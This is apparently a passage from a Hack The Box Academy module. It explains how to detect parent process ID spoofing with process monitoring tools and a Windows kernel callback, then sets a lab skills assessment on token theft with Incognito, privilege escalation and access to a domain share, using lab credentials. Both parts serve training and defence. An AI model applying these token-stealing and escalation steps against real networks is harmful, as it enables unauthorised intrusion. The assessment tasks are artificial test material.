![Procmon - Event Properties](https://academy.hackthebox.com/storage/modules/256/procmon1.png)

Instead of the `<unknown>` module, we should see the module name as `mmc.exe` in these entries if `mspaint.exe` was started by mmc.exe. However, because `mmc.exe` is not the actual parent that initiated the call to the process creation function, instead `real_parent.exe` is the creating one. The `<unknown>` module name actually represents `real_parent.exe` as confirmed in API Monitor (shown in the screenshot below).

![call trace](https://academy.hackthebox.com/storage/modules/256/calltrace.png)

The above screenshot shows the call trace of `mmc.exe` (captured by Process Monitor) and `real_parent.exe` (captured by API Monitor) where the addresses in the `<unknown>` module are same as the addresses in the call trace of `real_parent.exe`.

The address `0x00007FF7A05D7DD4` in the call trace of `mmc.exe` points to the address of the instruction after the call to `CreateProcessasUserA` in main function of `real_parent.exe`.

![function address](https://academy.hackthebox.com/storage/modules/256/func_addr.png)

## Detection using Kernel driver

One way to detect this is the same as how the EDR drivers detect it. This is done with the help of kernel drivers. To detect PPID spoofing using a kernel driver in Windows, we can register a callback routine using `PsSetCreateProcessNotifyRoutineEx` and examine the `PS_CREATE_NOTIFY_INFO` structure passed to the callback.

The screenshot below shows how the `PS_CREATE_NOTIFY_INFO` structure looks:

![notify_struct](https://academy.hackthebox.com/storage/modules/256/notify_struct.png)

```C
typedef struct _PS_CREATE_NOTIFY_INFO {
  SIZE_T              Size;
  union {
    ULONG Flags;
    struct {
      ULONG FileOpenNameAvailable : 1;
      ULONG IsSubsystemProcess : 1;
      ULONG Reserved : 30;
    };
  };
  HANDLE              ParentProcessId;
  CLIENT_ID           CreatingThreadId;
  struct _FILE_OBJECT *FileObject;
  PCUNICODE_STRING    ImageFileName;
  PCUNICODE_STRING    CommandLine;
  NTSTATUS            CreationStatus;
} PS_CREATE_NOTIFY_INFO, *PPS_CREATE_NOTIFY_INFO;

```

This structure provides information about a process creation event, including the `ParentProcessId` and `CreatingThreadId`. The `ParentProcessId` is the ID of the parent process as set by functions such as `CreateProcess` while creating the process. The `CreatingThreadId` is a `CLIENT_ID` structure containing the ID of the thread that created the process. This can be different from the `ParentProcessId` if process creation was initiated by a thread from a different process, such as when using parent process ID spoofing techniques.

The `CLIENT_ID` structure contains two members:

- UniqueProcess: The process ID.
- UniqueThread: The thread ID.

![Creating Thread ID](https://academy.hackthebox.com/storage/modules/256/creathreadid.png)

The `ParentProcessId` and `CreatingThreadId` should be the same in most scenarios, but if they are not, it indicates that the parent process ID (PPID) of the new process is spoofed, and the `CreatingThreadId.UniqueProcess` field will contain the PID of the actual creator process rather than the spoofed parent process ID.

Therefore, the inspection of both the `ParentProcessId` and `CreatingThreadId` fields can help identify potential PPID spoofing.

Below is a screenshot from a kernel driver project known as [JonMon](https://github.com/jsecurity101/JonMon), which has a kernel-level driver component designed to collect information related to system operations such as process creation, registry operations, file creation, and more. This also contains information from the CreatingThreadId CLIENT\_ID structure. The code assigns the value of `CreateInfo->CreatingThreadId`, which is a CLIENT\_ID structure representing the thread ID of the creating thread, to `callbackInfo->CreatorId`.

![JonMon](https://academy.hackthebox.com/storage/modules/256/jonmon1.png)

The uCreatorPID variable is assigned the value of the UniqueProcess field from the CLIENT\_ID structure creatorId.

![JonMon](https://academy.hackthebox.com/storage/modules/256/jonmon2.png)

Then, the `EventWriteProcessCreation` macro is used to write an event log entry for a process creation event. It takes several parameters representing various details of the process creation event, including the PID of the creator process ( `CreatorProcessId`), which we are interested in.

* * *

Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


# Skills Assessment

## Introduction

You are working as a Purple Team Analyst for Starlight Hospitals, tasked with simulating an internal attack to evaluate the security event logging of the company’s network. Your mission is to steal an access token, escalate your privileges, move laterally to the domain, find the hidden flag, and analyze the event logs.

## Part 1

A custom program `C:\tools\token-assessment.exe`, has been deployed, simulating token theft, token impersonation, and file creation on a remote share. Your job is to:

- Analyze the behavior of `token-assessment.exe` and verify the `event logs` both locally and remotely.
- Identify which user account was impersonated, and what file was created on the remote share.

## Part 2

In this part, you need to enumerate ACLs to access the path `\\dc01\C$\ADMINS$`. You may need to make token using the credentials `Legacy.corp\admin.user` and `password@123` to use at network level by using RunAs.

`Hint`: There is a security group where you need to add this user account to access this path.

Once you access the path, answer the questions mentioned at the bottom of this section.

## Part 3

Additionally, you need to find a flag on a remote file share. You start with a local administrator user account on a workstation within the corporate network. Your goal is to exploit access token manipulation techniques to escalate your privileges, gain access to sensitive domain resources, and ultimately retrieve the flag from a remote share that even domain administrators cannot read.

The diagram below gives an idea of the target account, which has two active sessions — one on the target (VM) and the other on a critical server where this user can read the file containing the flag.

![](https://academy.hackthebox.com/storage/modules/256/skills-assess_.png)

Step 1 - List the tokens using Incognito.

Step 2 - Steal an interesting token to impersonate, and create new cmd/powershell session using it.

Step 3 - Find and read the flag located in the file shares.

* * *

Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


